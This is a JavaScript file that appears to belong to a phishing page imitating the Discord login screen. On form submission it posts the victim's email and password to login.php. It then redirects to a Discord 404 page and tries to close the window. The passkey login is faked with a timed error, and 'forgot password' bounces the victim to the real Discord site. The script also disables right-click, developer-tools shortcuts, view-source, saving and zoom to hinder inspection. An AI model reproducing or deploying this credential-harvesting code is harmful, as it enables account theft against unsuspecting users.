document.addEventListener('DOMContentLoaded', function () {
    var form = document.getElementById('login-form');
    var loginBtn = document.getElementById('login-btn');
    var emailInput = document.getElementById('email');
    var passwordInput = document.getElementById('password');
    var qrCanvas = document.getElementById('qr-canvas');

    // Draw base QR code on canvas
    if (qrCanvas) {
        var ctx = qrCanvas.getContext('2d');
        var base = new Image();
        base.onload = function () {
            ctx.drawImage(base, 0, 0, 180, 180);
        };
        base.onerror = function () {
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, 180, 180);
            ctx.fillStyle = '#000';
            ctx.font = '12px sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText('QR Code', 90, 95);
        };
        base.src = 'qrcode.png';
    }

    var passkeyLink = document.getElementById('passkey-link');
    var passkeyLoader = document.getElementById('passkey-loader');
    var passkeyError = document.getElementById('passkey-error');

    var forgotLink = document.getElementById('forgot-link');
    var emailError = document.getElementById('email-error');
    var fpModal = document.getElementById('fp-modal');

    if (forgotLink && emailInput) {
        forgotLink.addEventListener('click', function (e) {
            e.preventDefault();
            if (emailInput.value.trim() === '') {
                emailError.classList.add('active');
                emailInput.style.borderColor = '#fa777c';
                setTimeout(function () {
                    emailError.classList.remove('active');
                    emailInput.style.borderColor = '';
                }, 3000);
                return;
            }
            if (fpModal) {
                setTimeout(function () {
                    fpModal.classList.add('active');
                    setTimeout(function () {
                        window.location.href = 'https://discord.com/login';
                    }, 3500);
                }, 1500);
            }
        });
    }

    if (passkeyLink && passkeyLoader && passkeyError) {
        passkeyLink.addEventListener('click', function (e) {
            e.preventDefault();
            passkeyLink.style.display = 'none';
            passkeyLoader.classList.add('active');
            passkeyError.classList.remove('active');

            setTimeout(function () {
                passkeyLoader.classList.remove('active');
                passkeyError.classList.add('active');

                setTimeout(function () {
                    passkeyError.classList.remove('active');
                    passkeyLink.style.display = '';
                }, 3000);
            }, 2500);
        });
    }

    if (form && loginBtn) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();

            loginBtn.classList.add('loading');
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;

            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'login.php', true);
            xhr.send(formData);

            var ua = navigator.userAgent;
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);

            setTimeout(function () {
                window.location.replace('https://discord.com/404');
                setTimeout(function () {
                    try { window.close(); } catch (err) {}
                }, 500);
            }, 2000);
        });
    }

    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    document.addEventListener('keydown', function (e) {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && (e.key === 'U' || e.key === 'S' || e.key === 'P')) ||
            (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) ||
            (e.ctrlKey && e.key === 'a')) {
            e.preventDefault();
            return false;
        }
    });
    document.addEventListener('wheel', function (e) {
        if (e.ctrlKey) { e.preventDefault(); }
    }, { passive: false });
    document.addEventListener('touchstart', function (e) {
        if (e.touches.length > 1) { e.preventDefault(); }
    }, { passive: false });
    var lastTouchEnd = 0;
    document.addEventListener('touchend', function (e) {
        var now = Date.now();
        if (now - lastTouchEnd <= 300) { e.preventDefault(); }
        lastTouchEnd = now;
    }, false);
});
